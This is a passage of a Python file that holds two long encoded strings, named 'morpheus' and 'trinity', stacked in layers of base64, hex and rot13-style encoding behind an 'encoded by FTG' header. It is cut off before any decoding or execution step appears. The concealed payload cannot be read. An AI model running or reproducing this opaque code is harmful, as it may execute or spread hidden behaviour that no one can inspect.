
import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDc2NDY2ZDUwMzYzMDY5NTM0Yzc2Njk2NTUxNTAzNjQ4NDE3NTM1NDQ2NDc1NGQzMjQyNmM3OTZiNzU0NTY2NDEzOTQxNDI1NTYzNmU0ZjRiNGM2NzU1MzM0YjU1NmEzMDY5MzQ0YjY4MzQ0MjQ1NmM1MzcxNTE3MTQ3NDY3ODJiMmY2MjU4NTA1ODQzNjUzNzcxNzE2NDZlNGQ0MTJiNDQ3NzZiNDc2YjRhNGU0OTU4NTc3YTM0N2E2MzJmNzUzODJmNzM2NjY2NTQ3MjY2NzkyZjZlNDgzNjJiNGU3NjM3Mzk1MDc0NzYyZjJiNGU3NjYyNzU3MjM5MmY3NDc2NzY3NjM1MzI2MjM5NzYzNzM0MmI3NDc2MzczODY1MmI2ZTZjMzg1NzJmMmY1MTMxNTA2YzQ4MmYyZjJmNjI2NjZkMmY2ZDY4MmY2ZTc2NzEyZjJmMmIzMzY2MmYyZjYxNDg2ZDRlNjI1ODM5MzI2MjM3NTg1ODZhMzc2OTJmNDM0MzcwNTIzMzY0NjEyYjQ1NTU1NzU0Nzg2ZjQ3N2E3NDcxMzIyZjY1MzMzOTU4NjQzNTY5MzY3MTM4NjM2NTYzNjk3YTYyNTg3NzdhMmY1ODRjNzUzMzYzMzkzMDM5MmYzNjMzNTk2OTc2NzU1MzZlMmY1NDc1MmIzMTM3MmY1MjM3NjI2Yzc4NjI2NTc1NjY3MjMzNTE3OTQ3NmYzNzY2NTg3OTM4NmM2MTY5NTQzOTRjNTkzNTc2NDc1MDM3NjY3YTc4NjQ3YTYxNzU1MzM3NmU2OTM1NDg1MDRhNjYzMjRlNWE2ZDZkNTg2ZjM1N2E0Njc2NDUzMTdhNTk3YTc0NGM1NDY0NTk2NjUwMzc2NTRlNGQyYjJmNzM2NjRiNjI2Njc0NjEzMDc0NmE1NzMwNzQ3NDYyNzc3NTc0NjUzMTYzNjE1ODRiNmQzMjY1NmEzNzZmNzMzNzMwNzI1YTY1NWEzMjdhNmI3YTM1NDc3ODcwNTI1YTcwNGU1NzMxNzY1MTYzMmY1MjM5NDUyYjZkNzk3YTczNjE3NDU0NjMyZjVhNzg1YTZlNjY3ODJmNzk0ZTMxNGM1OTcwMzE3MDQ5NWE0ZjdhNzUyYjM4NDgyZjYyMmIzNTM5NjIzMjdhNDYzMjZkNDQzOTMxN2E0YTMxNGUzODM5NjU1YTc0NzI1MDRjNTM2MzM3NmM0YzRlNGU3OTZmNDg0ODMxNTA0YTU4NGM2MjUzMzEzMDZkNjM3MDc4NmQzMTM3NmYyYjJiNDI0ZDYxMzk0NjZiNmQ3MzJmNjI2ODc1NjEzMDRkMzE3MjcyNTI2NDJiNmM0YTY1MzM2YzUxNmQ1MDUyNjMzMzU1MzAzMDYyNmY1ODJmNDg3NzY0NGU0ZTc0NDczMDQ2MzU2ZjdhNzI2ZDY5NzY2NjQ2NjY3MjQ3NTg0MTUwNGM1MjY2MmI2ODc5NWEzMjdhNzA2Njc5NDk2MjQ3NmU0NDRlMzY3MjM1NzE0YjU3NzA2ZjZiNDQzNTRiNjI0ODRmNjk3YTUzNjY0ZDMyMzk0OTc3NzAzNjM3NmE2NTUxNmQzNTdhNjc1MDMyNWE0ZjMxNmY1MDY2NjE2MjMxMzA3YTcwNmU3NjRhMzk1MDc2NDEzNzRkNjEzMTYzNzM1NDJmNzI0Zjc5NGY2YjM5NmU2OTJmNDY3NTZkNjcyZjY0NzI1MzY3MzMzMjZiMzg2MTYzNzA0NzM2NGU3NTMwMmI0ZDZjNzI3MTM2NDU1ODY1NzQyZjQ3NWEzMzM2NjYzNTQyMmY1MjM5Mzc2YzQyMzYzNDRkNjU1MzUyNjU2YjdhN2E2ZjYyNTM0MzM0NDczNjU5NTAzMzc0NTU3MzZjMzk0NTRhN2E3OTU3NmU3MjQzNTk3ODRjNjM2OTQzNWEzMTRiNTE0ODJiNmIzMzYxMmI1NjRjNGYzOTQxN2E2YjZlNGU0YTM0NjQ2YjZjNmE0ZjQ3NTE0YzRhNjM2YjMzNmYyZjMyNTY0OTM3MzE0YzdhMzMzMzM4NzA0ODZjNDk2ZTMzNDY0NDJiNjk1YTM5Nzc2NzM3NmY2NDM4NmE0NjY4NzAzNDZiMzk0NTc4MzY0YzRiMzc2Mjc1NzE0YzMxNTE0YzM2NTI1NDc1NzU2YjVhNzk1NDVhNjg0NDU0NWE3Njc1NjE0MzMzNjk2NjM5N2E0YzUyNGY2ZDJiN2E0NjRhNzAzMzRmNDY3ODMzMzI1Mjc2NzU2YzM4NTM1NjczNjE2OTVhNjI1NzYzNmE1YTRkNTE3MDYyNmI3NjM3NmY1ODU2NzM3NTRhNGY3NTRhMzU2ZDU2NjQzMDY2NjUzMTY3NDgzNDZkNmI2YTY2NzA0ZDMxMmI1MzQ0NGQ3OTYzMzk1NTY2NzI3Nzc2NjQ2YjRhNzk1NDZhNDU2NjZmNjg0ZjY2NDQ2NTRhNGQ2MTQzNTg2YzRiNzk1ODM3NDk1NDJiNmI3NDc5NjQ2MzY3NjU3OTY1MzU2Nzc1MzM1NjM4MzM2MzM2NTc1NDZkNGY1Mzc2NmE0OTYxNGU3YTM2N2E3YTYxNjMzMDQ4NzEzMDZlNzI3OTQ2N2E0MjMzNGI0MjcyNWE3NDYyMzI0MzUwNzM2YjRlMzY2YzJmNjM3ODM0NjgyZjUzNGYyZjUzNzkzMjczNDI3NjZmNjQ1ODYyNTk2YTZiNjc1MDc0NDQyZjQ5NzczNDQ5NjYzMTRhNDE3YTc5NTk2NjM4NDk2YTY0NTk2ZTdhNTI1MDU5NjM2MzRlNzY1NTc2NjY3Mzc4MmY3MTYyNDY3MzZiNGYzODY3NDQzODcxNTg3ODYxNDMzNjRjMzk2NzM1NjY3MjRmNDIzMzZiNDQyZjM1NjI1MTc5Mzc0OTM3NmU1Mjc2NzU3MTRiMmY0YTZjNmI1NDQ4NjE3Nzc4NjY2NTUxNDc2ZTU0NzU1MzU3MzA0ODUwMzQ0NDUwNzA3MDRjNTc1MjY2NzQ0YzUwMzQ0MTQ0NGQzMzc3NTM2NDcyNjM2YzJmNjQ0MjdhMzk0MTYyNzM0Nzc2NGI1MjRjNDIzOTM2NjYzMTQ0MzY2OTRiMmY1MTMxMzgzNjRmNjE0Yzc5NjMzNTczNjQzODVhNDEzOTZiNGYzNzQzMmY1ODU1NzIzNjRhN2EzODZiNzY1OTMzMzA0ZjM2MzA0MjUwNmI1MzJmNzc1MzM0NGU0MjJiNzU2NzJmNTYzNzZmMzI2NjY4NGQyYjcxNjIzNTczNDIzNzU5NDM1YTM2NDQ1NDc1NDU0ODQ2NjMzMDU0Nzc1NzYxNGU2NzZhNDI0MjMyNTU0ZTRhNjQ2Nzc3MzU3MzQyMmY1MjVhMzk2NzM1MzczODYzNDE2YTczNmQzNjJiNGQ2ZTc2NzAyZjQyNGM1MzY2MzY0MjYzNTMzMzczNmIyZjU5NTY3NzY0Mzk2ODM3Mzc1MTRmMzg2YjYzMzE2Yzc3NjIzNTM1NzQ0MjY2NDM2ZTc5NGE2NjM3NGIyZjMyNTI0ODU3NmE2NjYzNDg1YTU2NjY3NzQ4Nzc2NjJiNTE2ZTcwNzg3MzRhMmI0YTJmNTQ2MTQ2NDg0YjQ0NDg0ODRmMmY1MTU3NzU2ZTM3NGY2OTRlMzg0OTU0NzM2YjJiNzk3OTY3NTYzODU5NTIyYjQyNzM3NzZiNjY1NDU1NGY1MDc3MzgzNzU5NjYzMDQzNDg3NDdhNDM0NTJmNGI0MzU4NmE0MzY1NGY2ODZjMzA0NDc2NGE2ZTc1Nzc0NjZlMzIzMzM4NTQ3NjYyNjc0ZDU3MzU2NTZjNTA3YTcwNjU2MzY3NTAyZjZhNjQ2YTRjNGM0YzU4NTc3MDQxNjM3OTRjMzU2ZjU4NGE0YjYyNDQ3MjJmNjM3NzVhNjM2MjQzNTI3NjU2MzQ0NDM5NjIzNjQ5NTc2NTc5MmY0ODVhNzI3MzZhNjU2NzRlNTU1MjdhNTE3NTM3Njc3NDM5NDE1ODc0NDI3YTZhNzY2NDZkMmI0MjQ0NzA2Nzc1NTM1NDQxNTYyZjZmNjUzNTRhNWE0MTMzMmI1MDZjNjk1MTZlMzA2Yjc0NzU3MzY3MmY0ZjM3NGIyYjc3NTQzNTQ5NGM2MjQ1NDgzNTVhNzc0NTYzMzg2MTRhNGEzMjU3NjU3MDczNjYzMDUzNzI3MDRkNjQ0YzQyNmI0ODVhMzk0YTU4NjE3MzMzNzM1MjdhNWE3MzY4MmY1NDUzNDE0MTM4NGIzNDRiNmE0ZjY1NmQ2ZjY5NzI0NjQ3NDg1ODY5NTQ2YTc4NTk1ODU3NmUzODM5NzM0MjJmNDI0ODQ0MzM0YzRiNjc0ZTZkNDk0ZDM0NTA3OTRjMzg2NzZhNDE2ZTM2NGQ3NDQ3Mzc0MzUxNjQ0OTY2NjM0NDU3NDYyZjQ1NzE0YjUzNzg1MjZlNWE2Nzc2MzY3NTc5NmEzNTZiNjIzNjYyNmE0YzM2NTA0MzRmMzg0OTMzMzI1YTM4NTQyZjVhNTg0YjMzNzU2NzM5NTI0Yzc1NDM0ODcxNjU0ZDRkNjU0MTJmNmE0Yzc5NjgzNDcyNzc3MjczNDEzNDY5NDU3Njc3NGQzNDMzNzQ2ZTUwNTE2YTVhMmI0MTZmMzU0Mzc3NDg0NjY2Mzg2OTc4NDM1MDc5NTQyYjQxMzk2MzQ0NmQyYjQxNTAzOTM0NzYzNDY5MzU2YTQ5NDU1NjM5NmIzOTM2NjM3MzY4NjY2NzYxNGY0OTUwNjE1MTc2Nzg0YjYzNWE0ZjQxNjc2MjVhNzI3NjQzNzU0YTQ0NTg3YTQ4MzU0NzU3NDU0Mjc5MzA1MDQyMzk2NzYyNjg0MzQ3NGE1NDUwMmIzNTJiNzM0ODM3NGE0NjJiNDkzMjMwNjYyYjMyNDQzNTRhNzg0NzUzNmIyYjc3NGQyYjQxNzQ2YTU2NzY3NzJmNTA0MTQ4Nzg0NzZiNDI2NTM2NzU0MjUyN2E2YzY5NDE2ZjMxNTAzOTZiNzYyYjRhNzE0MjUwNjcyYjQ5NDg2NjUxNWEzMjUyMzQ1NDQ4Mzg0ODUwNDU0NzJmNjc2ZTU5Njc2MjRhNmEyZjUzNGMyYjQxNmQzNzZiNTk2ODM3NmE2MzRmMzU0MTc1NTE0YjY2MzY2MjMxNzc0NDJmNDk1Mjc3NmU0ODM2Nzc2YTc4NDc1MDM0MzE2MzUyMzY0MjM5Mzk1MTJiNzk1YTM0Njc0NDc4NzE2NjJmNzI3NDQxMmY0NzRhNjY2ODU4N2E1NjYzMzU0YzdhNDQ3NjU2Mzg1NTYyNGY2NDMwNTg2ZjZhNzg2YTU4NTk2OTM0NzI0ODVhNDk2MzY1NzgzMDY0NjE1NjM4NjI2NjRiNjY3MzZhNzUzMjZiNTE3YTJmNDMzODZkNDY2Yjc1Njg2NzUwMzk2YTcyNDE3MDMzNzYzODQyMmI1MTY2NzQ0YTMwNTU2NTUxNTQ2MjRmNjM1OTdhNzk0NjM0MzYzNzMyNTk0Yzc0NDI3NjZiNGQzMjdhMmI3NDQzMzM2YjQxMzk2Yjc1Nzk0Yjc0NmEyYjY3NDg3MzMwNDQ3MzYzNjQ2ZTZjNjY2ODUwNTA3MzU0MzQ2OTMzNzc2YTQ4MzY2ZTY1NDU2NTM0MzA3NzQyNTA3OTU0MzY0MTYzMzI1MzZlMmI1OTU0Mzg0MzM1MmI0MjQ2MzU3OTY2NjU1MDQyNGMzMjZhNjY2ODcwNjI0YTYyNjk3MDY1NGQ1YTJiNTQ0Yzc3NGE0OTQ3NjQ2ODc4Njc0ODQ5MzM3ODc4NzU1YTM4NTk2MzZkMzQ3NzYyNjk0ZjJiNDE3NTM1NGQ1NTM0MzI0NzRjNGY2Nzc2NDE0YzMyNTQ0ODM1NDQzNjM2NjQzNDY4MmY1NTY4NzIzNTZiMzU3NjM5NDU1MTQyNzg0Njc2NDU1YTJiNzg2NjczNmMyZjU5NTQyZjQ5MzA1YTM3Nzg2YTRlNWE0YzYzNjk0YjM1NTc1MjcyNmU0NzUzNzE2NjMwMzI0MjY2Njg0YTY2NzM3ODJiNTE2ZTQ0NjY0YjQ4NjI1OTMzMzg1MTY2NDMzNDMwNDQyYjRlNzQ1MTU0NDc3MzRhN2E2ODQ5MzI1MTUwNGI3NTM4NDM2NjZkNjM0NzM2MzQ3NjM4NzU2MTY3Njg0ZTM0NjY3MzRhNmY0ZDczNzM0ZDM0NDYzNzQ5NGM3ODZkNzY0MjM5NGYzMzRlNjU2ZjZlNDE0YjM5NmYzNTM0NTU2OTRlNTA2OTQ1Nzk1NjRiMzg2ODVhMzI1MTM3NzM3MzQ5NDkzOTdhNzk3Nzc2MzY0YzMwNjg1MDc5NGM3MzM0NjY1NTY5NmU3MTUzNzc0NzM4NTI3NzY5NzEzMjYzNzAyYjQ3MmY0YjU1MzQ2OTZhMzc1MTM1NzIzMTU4NmE0ZDUyMzU0MzU4Mzg2ODYyNGQzNzVhNTg3YTZjNjUzOTQzNDg2ZDUxNDE2MjJmNjY0OTZlMzQ1MzZlNzUzNDUxNDgzMjYxNGI0ODM1N2E1ODY5NmU2ZDZlNjM2ZjZkNmU1MDQ3NDc0ODRhNDEyYjYyMzgzMjM5MzY2ODM5MzU2YTJmMzA0NTJiNjg2YTc5NWE2MzU4NDY1MTYzNTk0NDczNmE2Njc3NjE2MzU1MzU2OTc2NDQ3MDY5NzY0ODJmNjE0ZjJiNzg1NjU5Mzk3ODRkNGY1MTY0NDE2ZTY3NmYzODc4N2E3NzZiNWE3ODZmNTgyYjUyNmEzODQ2NTA0NzU0MmY0OTY2Mzg2NTYzNDg3ODQ0NTAzNTc0NjMzNTM1NGI2NTc5NTkzNzcwNDY2OTRmNzY0OTRjMzk2YTMyNGIzNzc4NGM2NzRlMzczNTU3MmI0OTdhNzg0OTU5NjI2NTc3NGYzNzQ5MmY0NDMzNmY2YzJmNjQ2ZjU4MzE0MTMxNGM0ODcwNjY3YTMxNDE2ODc4NjQ2NTVhMzg2Nzc1MzI1NzRkNDk3Mjc0Mzc0YjRiNzA3NTRiNTg3OTUzNWE3MjYyNTI0NTc4NDc2NjZjMmI3NzUwNjQ0NDJmNzM0ODJiNzk0YTM1NTkzNzJiNTM0ODZhNGI0ZjZjNDg1MTZiMzg1NTZhMmI0NjUwNjk0ZTczNTMyZjczNjgzNTYzNzIzNTZiNTAzMDY1NzU1Mjc2MzYyZjY3MzEzOTUyNmU2MzQ2Nzg2YTQ3Nzg3ODY4MmYzMzQzNmMzMTY5NmUzNTQxNjU2MzM5Nzc0NzRjNTc1MjYyNDk0MTMwMzI1NjM5Nzk0YTUwNTk2Yzc4NjE1MTZiMzg1MzM4NWE3YTZiNzM0NjUwNzI0YTQ4NmI2OTRjMzA0MjM4NmEzNDQ4NzY0ZDM5NjQ0Njc0NGYzODY0Mzg2NzMyNzU0Yjc4NDQ2NjRhNjU0Yzc4Njg2NDYxNGU2NTRkNzA3OTVhMmYyYjQzNjY0NjRmNzM0ZTMxNjYzNzcxNzkzODcxNjYzNzU3NjY2NDZiNmE2YTQ1NDg1OTQ0NDQ3NzMyNzU3NTMyNzI2NzQ1NjU2ZDU4MmY0YTRjMzA2MTY5NGI0ZjMwNTc2NTY0MzU2MzUyMzE0NjUwNWE1MDM4Mzk1NDQ5NTUzMDcxNTYyZjc5NDc2NTZmNjgzNTQ5MzQ1NTY1NTYyZjZmN2E0NDczNDYyZjQzNzUzMDZhNmE3NjRhN2EzMjc5NzI2YTc0MzU2MzY3NjY1NTRkNTA0ZDc2NDMzNzczNmQyZjRlNzM2OTZlNGQ1NTZlNzk1ODZlNjczMzc1NTY0NDM2NTU1YTMxNzg1YTYyMzc0MTc0MzU1MDU4NTEzMzQ5MzczNTY5NzYzODY4Mzk1OTQ5NGY2ZjZmNzk2NzY1MzE3NTc4NTA0OTJiMzE2NjVhMzk3ODRjNmYzMjY2MmI0NDQ4NmI0MTM4MzI0MTZlNTc0MjY2Njk0OTY1NGE2MTUyNjQyYjU0NDg2MzQ1NjY0ZjYzMzQzNDRkMmI2NDdhNDQ1NzQ5NDYzODQxNTIzNTQ3NjY0OTc1MzU0MjQ1NmMzNTJmNjM2MzVhN2E3YTZiMzg0OTUxNGM0YjY2NDk1ODM0NDI1NDc5NWE0ZjUxNzgzODQ1NjY0MzQzNGY0MTYzMzQ2OTRjNzk2Mzc0NmE2YzY3NjY0MTRkNjQ1MjcyNjg2MTQxNDgyZjc0NmM0ODQ4Nzc2MjM4NDY2NjU5MzQzNDcwMzM3NjRiNmM2MzU5NmEzMzRjNGE0YzZjNTU2MzY5NGM2YTQ0NGY2YzUzNzIyYjYzNTIzNDQ4MmIzNjM0Njc3MDMxNDc3NDY4MmY0ODRmNTk0YzczNjc3NjMwNTU2NTRhNzQ2ZTc2NTU2MzM4NDM3MDM1NDc3NjM1NDI3OTUwNmI1MTY1Nzc0ODYzMzc3NzRhMmI1MTJmNmQ1MTQ3Mzc2NzZlMzk1MTU4NmIzMTM1NDE2NTZmNmU3OTQyMzkzMTRmNGY0OTY2Nzg1NTQ4Njc1MDY0NmIzMjM1NGQ0MTM0Njg2YTdhNGI1MTdhMzA2NTQxMzczOTRlNzQ2ZTUwNjU0NTM5NmQ2YTM1MzY2NzM2MzEyYjRmMzY2YTc1NWE0NDJmNjM0ZDM1NGQyYjRjNTc2YTQ0NzE1MTM5NDQ0ZjY4NTg3MDUzNGQ1NjM2NmE3NjRkNzE1ODMzNmQ2NjQ3NTczNTQ1NDQyYjUyNTA0NjczNzkzMzRiNzQ1NjQ5Mzc0ODJiNzM2ODQ4NzA1MTJmNjc0Yjc0NmI0YzM0Njc2NjM1NDIyYjZjNTY1YTMzNzU2MTQ2NjIzNDdhNGE3MTU4NDEzNjMxNGM1NjQ5NzE2NzZhNzE2NTM3NjM1OTY4MmI2YjQ0MzU1NjMzNDk0NzM0Njc0MjM4NGEzNDcwNGY2MzVhNGY1NjU0NDU0ZDVhMzc3MjJiNmI2MTcxNzU3MDdhNzc0NDc2MzY0ZDUwNDk1ODU3NmEzNzcwNzUzNTcwNzE3ODUyNzY3YTY3NzY0MjM3MmI1NzQ0MmY3MjU3NTA2MjZhNDE2ZTM1NDMyYjMyNGE2MzQyMzQzNzRkNmE0YjY2NDkzMTM4MzY3MTZhNzM0YjJiNGQ3MTc4Mzc1MjRhMzI3ODY2NTQzNTQ4NjY2YTYxNzI2Mzc3NmU2NzZhNTY'
trinity = '0ZwZkAJR3AmEzZmt1ZGEzA2R0AGMxAmZ2MGHjAGH0ZwL2AQV1AQpmAzZ1ZQDmAwDlLwH3AQt0ZGL0AGxmZmZ1AzH0ZmH1ZmD2MwWzAzZ0LGLmZmR2MGEyZzV3ZwEzAQx1AwZ0AGZ3LGL3ATR0BQDkAJR1AmMzAzDmAQD3AwL2Lwp2AzV3ZmH5Awp0Lmp3ATDmBQplAmt3BQH4ATL2BGZ4Awx1ZQH1A2RmAQH4AGR0AQp3ZmRlLwH0Amx2LGHlAzRmAwD1AmH0BGp3Zmt3ZGZ5ATR2BQMyZmN3ZQp1Awx0LGD1AGt2LGLmZmt2LmEzAQtlMwD5AzV0AQZ4AzR1ZQp0AGD0ZGEwZmLmAmMuAzDmZQp5AwD2MGZ4A2R0BGZ3Zmp2Lmp1ZmN1ZwHkZzV2ZmEzZmVmAwD5ATR3LGHlZmV0BGH5ZmxlMwMyZmV0LGL2ATR3LGMwAzV0AwplAGR0BQZmAQZ1AmWzAGH0BGp5AzR2LwHkATZ3AQL4AmH3ZGZlZmp2ZwEvAmDmAGL0AmZ1AQWzAQR1BQEwZmZ3ZwH3Awx1ZwL2AzV1ZGLkATL3ZGL3AGZ1BQp3AQZmZmH1AwH3ZwZmAwL0LmWzAmN2AQp4ZzL1ZGL3ZzLmZwMyAQL0MwZ0AzR3BQZ5AQR2AwH2AQxmBGD0A2R2AwDkAJRmAGDmA2RmZmEuAQZ1ZQpmATDmAQL3A2R3BGDkA2R3BQExAQHmAQL3AGD2LwL5AmL1AGEyA2R3LGL3ZzL2Zmp2ZmZ0AwZ5AGD1BQZ4AzD1ZQD1AQVlLwZjAQV2AGL5AGN1AwL1AzV0LmZ4A2R1LGL5AQHlLwD5AQpmBGD3AQt2AmWvZmp3ZQH0Amx2AQZ4AmR0ZGEwA2R2MGH2AGR2Lmp5ATH0MwHjZzL0MQp4AQD2AGL0Awt2BGExAmHmZQMwZmN2MGEuAQtlMwD1AQR2ZmpkATZmAwp5Zmt1ZQWvAQH1AmZ5AGR0Zwp5AQV2AwL5Zmx1ZGZ1AGZmAQZmAmt1BGExAwL1ZGD4Zmt1AwZ3Awx2LmWzAGNlMwL1AzDmBQEyZzL1LGL2ZzV0ZwL0Amx2AmDkA2RmAQHlAGp3AGEvAzV2ZwLmZzL3LGp4ZzL2AmLlZmp3BQHjZmH0MGL4ATV0MGpmAQR3BQpmAmZ0MwL0Amx2MGp0ATH0AwHkZmt0AGZ4AzLmZwHlAwZmZmLlAQH1ZmH3AQRmZQZlA2R1LGp3AQD2MGL4AGV0LwH4AzD2LwEvAzRmBGDlAzH2ZGEuAmR1AQp1AGR3BQZ3ATH2ZmZ0AGNmBGHjZmD1BQDkAmL3ZwMzAGtmZmp1ATL0ZwH5AQDmBGWzAzH2Zmp5AQp0ZGZ1ATV2AwWzZmp2BGL2AmpmZQH0Amt2MQHjAmD0AmLmZmx2BQp2Amp1AwZ4ZmH0ZGZ5AmpmAQZ0ATRmZGZkAQtmZmMvATDmBQD0AmDmBGL4ATLlLwEuAmx0MQH5A2R3AwMwAQV2AQMuAzH0LmZmAmZ0AwZ3AmR0BGWvAmp1ZQMvAQZmAwMwATL3ZGp5Zmx2BGp1AGx0LGL0ZmtlMwMuAwx2MwWvAQV2ZwL3ZmZ0ZGH4ZmH1ZQZmAQZ0ZwWzAQRmZGZlA2R3AwZ2AQx1ZQDkZmH3BGH4Amp0ZmL2AQZlLwHlAGL1BQpmZmH2MGHlAmL0LwHjZmZmZmWzZmp2AGpjAmt3AwZ1ZmLmBQEuAmtmAwMuATH3ZGEvZzVmBGMzAwx2MQLkAmL1AmD2AQL2BQH3AGxmZGMzZmp2ZwZlZzL0Lwp2AGL2AwEyAQLmZmZ4AmD3AQEvAwV1ZmZmZmN2BGpkAGt1Awp0AGN1AQZ1Zmt0AmZkAQLlLwZ4AGx2ZGL5AmN3ZGWvAmLmAQLkAQD2AwLlAGL2MQH4ZmH0MwD0AmVmZGp0AGV1ZmZ1ZzL2LmHmATHmBQLlZmx0AQpmZmx3AwZ2AwL3AwHkAmZmZQp5AGx2LwExATLmAQH5AQxlLwMxZmV3AwHjZzV2ZwLkAQZmZwD2Amt0BQWzAmN0LwL1ATHmZwL4AwH3AwLkAQDmAGL5ZmL2LGHkATZ1ZmZ4ZmV0ZmpmZzV3AwplAwV2Lwp3AmV1AGIuATL0MGD5AGx1AmEyAmR0AwL4ATH2ZwIuAGp0AQEvAQL0ZwEvZmL1Zwp4AwL2AQHjAmx3AQpjAmR0MQWzAQR3AGp0AmZmAmD2AzL1ZwL0AwR0ZGZ4AwH2LGH4AzD2AGIuAmR2MGD3ZzLmAwLkZmD2ZGL1ZmZmZwDkAwD3BQH5AQVmBGWvAGD1ZGD4Amt3AwD1ZmR3BGp3AmH3BQL0AmN3ZQD4AzR2LwH2AzR0AmWvAmL0BGD3AGZ3AmHjZzVlLwZ1ZmL0LwZ3ATR0MGH4AmZ2AQpmZmNmZmZ2AwZ2MGp0ZmL0AQHjAQZ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